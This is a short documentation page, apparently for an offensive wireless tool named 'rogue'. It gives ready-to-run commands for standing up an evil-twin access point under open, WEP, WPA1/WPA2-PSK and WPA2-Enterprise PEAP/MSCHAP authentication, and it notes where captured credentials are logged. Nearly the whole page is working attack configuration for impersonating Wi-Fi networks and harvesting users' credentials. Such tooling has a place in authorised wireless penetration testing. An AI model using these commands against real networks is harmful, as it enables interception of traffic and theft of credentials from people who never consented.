Configuring evil-twin AP with different authentication methods
==============================================================

Open Authentication
^^^^^^^^^^^^^^^^^^^

.. code-block:: bash

   sudo python3 /opt/rogue/rogue.py -i wlan0 --auth open --internet --preset-profile wifi4 --channel-randomiser

WEP Authentication
^^^^^^^^^^^^^^^^^^

.. code-block:: bash

   sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wep --wep-key-version 0 --wep-key 4141414141 --preset-profile wifi4 --channel-randomiser

WPA-PSK Authentication
^^^^^^^^^^^^^^^^^^^^^^

WPA1-PSK Authentication
-----------------------

.. code-block:: bash

   sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wpa-personal --wpa 1 --wpa-passphrase "test test" --preset-profile wifi4 --channel-randomiser

WPA2-PSK Authentication
-----------------------

.. code-block:: bash

   sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wpa-personal --wpa 2 --wpa-passphrase "test test" --preset-profile wifi4 --channel-randomiser

WPA2-Enterprise Authentication
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

EAP-PEAP/MSCHAP Authentication
------------------------------

.. code-block:: bash

   sudo python3 /opt/rogue/rogue.py -i wlan0 --auth wpa-enterprise --preset-profile wifi4 --channel-randomiser --default-eap peap -E all

.. note::

   Captured credentials will be stored in ``/opt/rogue/logs/freeradius-server-wpe.log``.
